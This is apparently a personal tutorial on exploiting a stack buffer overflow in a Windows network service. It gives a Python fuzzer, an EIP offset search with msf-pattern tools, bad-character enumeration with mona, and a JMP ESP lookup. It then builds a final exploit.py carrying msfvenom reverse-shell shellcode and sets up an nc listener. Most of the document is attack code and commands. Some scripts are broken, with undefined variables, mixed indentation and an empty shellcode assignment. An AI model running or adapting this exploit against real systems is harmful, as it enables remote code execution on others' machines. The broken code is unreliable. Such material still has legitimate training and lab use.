##### BufferOverflow

To exploit this application via buffer overflow, firstly the application must be crashed. This is done by using the fuzzer below. 
This fuzzer will send an array of increasing values, where the value is "A", until the application crashes and will leave you with the correct number of bytes needed
to crash the application.

fuzzy.py

```
#!/usr/bin/python

import socket, time, sys

IP = "<IP>"
PORT = <PORT>
timeout = 5

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((IP, PORT))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send(string)
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + IP + ":" + str(PORT))
        sys.exit(0)
    time.sleep(1)
 ```
    
   
   Once the application has been crashed. It is time to overwrite and take control of the EIP pointer. To do this I will create a unique pattern using
   msf-pattern-create, using the greatest size of bytes used to crash the application via the fuzzer.

Create a working directory for !mona
```    
!mona config -set workingfolder c:\mona\%p
```

Create a pattern to overwrite

```
msf-pattern_create -l <i.e 2560 or 0xA00>
```

Find the offset

```
msf-pattern_offset -l <i.e 2560 or 0xA00> -q <i.e 33794332>
```

Once the offset has been found. In this case 2288, over the original 2560.

```
Creating the inputBuffer

filler = 'A' * 0x8f0 #2288   This is the space to write to get to EIP
eip = 'B' * 0x4      #4      This is the space we need to take over EIP
buffer = 'C' * 0x616 #268    This is for Shellcode ;~)
```

This should equal 2560 as the original size of the pattern created. 

To test this I have created the exploit, working primarily into this file as I go forward.

exploit.py 
```
#!usr/bin/python

import socket
import time
import sys


try:
	print "Checking...."

	filler = 'A' * 0x8f0 #2288  
 	eip = 'B' * 0x4     
  	buffer = 'C' * 0x616 #268  

	inputBuffer = filler + eip + buffer

	content = inputBuffer 

	buffer+= content

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect(("192.168.178.10", 80))
	s.send(buffer)

	s.close()

	print 'Done! =]'

except:
	print "No Connection --------"
	sys.exit()
  ```
Running exploit.py, EIP should now be equal to 42424242 (hex value of “BBBB”). I now control EIP!

Now that EIP has been controlled, it is critical to gather a list of bad characters, when the shellcode is generated any invalid characters could
stop the payload from being read through the application. 

Finding bad characters with !mona. '\x00' is always considered a bad character as it will truncate shellcode when executed.

Creating a list of badchars using !mona
```
!mona bytearray -b "\x00"
``` 
This will exclude the bad characters
```
!mona compare -f C:\mona\<PATH>\bytearray.bin -a <ESP_ADDRESS>
``` 
This will compare the remaining list against the application. 

Repeat those two steps until the results status returns Unmodified, this indicates that no more bad characters exist.

Once I have enumerated a list of bad charecters I am going to test this manually using a modified version of exploit.py 

I have removed each bad charecter found in the list created using mona! from the badchar array in the script below, so if all bad characters have been caught the script below should run all characters in the array without fault. 

```
#!usr/bin/python

import socket
import time
import sys

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
	"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
	"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
	"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
	"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
	"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
	"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
	"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
	"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
	"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
	"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
	"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
	"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
	"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
	"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
	"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

try:
	print "Checking...."

	filler = "A" * 780
	eip = "B" * 4
	offset = "C" * 4
	
	inputBuffer = filler + eip + offset + badchars

	content = "username=" + inputBuffer + "&password=A"

	buffer+= content

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect(("192.168.178.10", 80))
	s.send(buffer)

	s.close()

	print 'Done! =]'

except:
	print "No Connection --------"
	sys.exit()
```

Finding JMP ESP

Now that control of EIP has been taken, and all bad characters have been eliminated, the next thing needed is an address to jump to ESP.
This can found using !mona.

To load mona modules:
```
!mona modules
```

Finding a .dll where Rebase, SafeSEH, ASLR, NXCompat are sets to False. When you found it, run the command below to search for a 
JMP ESP (FFE4), inside the dll :
```
!mona find -s "\xff\xe4" -m <DLL>
```
Return address
Choose an address in the results and update exploit.py :
Setting the retn variable to the address, written backward (little-endian)

```
JMP ESP address

0x625011af

# exploit.py
eip = "\xaf\x11\x50\x62"
```

Generate the shellcode 
```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> –e x86/shikata_ga_nai -b "<BAD_CHARS>" -f c
```

Prepend NOPs

A NOP-sled is a technique for exploiting stack buffer overflows. It solves the problem of finding the exact address of the buffer by effectively increasing the size of the target area, \x90 represents a NOP in assembly. This instruction will literally do nothing and continue on with code execution.
```
padding = "\x90" * 16
```

Start an nc listener on port 1234

```
sudo nc -lnvp 1234
```

Final Exploit

exploit.py 
```
#!usr/bin/python

import socket
import time
import sys


try:
	print "Checking...."

	filler = 'A' * FillerNum 
  eip = ''  EIP ADDRESS 
  buffer = 'C' * 0x616 #268  
  padding = "\x90" * 16
  
  ## Generate Shellcode Command: msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> –e x86/shikata_ga_nai -b "<BAD_CHARS>" -f c
  ## Bad Charecters: 
  
  shellcode = 
  
	inputBuffer = filler + eip + padding + shellcode + buffer

	content = inputBuffer 

	buffer += content

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect(("192.168.178.10", 80))
	s.send(buffer)

	s.close()

	print 'Done! =]'

except:
	print "No Connection --------"
	sys.exit()
  ```




